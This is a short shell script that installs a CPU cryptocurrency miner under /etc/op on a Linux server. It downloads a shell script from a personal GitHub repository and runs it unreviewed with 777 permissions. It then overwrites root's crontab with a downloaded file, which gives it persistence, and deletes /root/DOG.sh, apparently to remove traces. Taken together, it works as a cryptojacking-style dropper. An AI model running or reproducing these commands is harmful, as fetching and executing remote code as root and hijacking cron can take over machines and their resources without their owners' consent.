yum -y install screen nano wget 
apt-get update
apt-get install screen nano wget
mkdir /etc/op/
curl -o /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -L https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
tar -xvf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -C /etc/op/ 
rm -rf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
curl -o /etc/op/dogcoin.sh -L https://raw.githubusercontent.com/rezabagh/reza/master/dogcoin.sh
chmod 777 /etc/op/dogcoin.sh
bash /etc/op/dogcoin.sh
curl -o /etc/op/note -L https://raw.githubusercontent.com/rezabagh/reza/master/note
cat /etc/op/note > /var/spool/cron/root
cat /etc/op/note > /var/spool/cron/crontabs/root
cat /var/spool/cron/root
cat /var/spool/cron/crontabs/root
rm -rf /root/DOG.sh

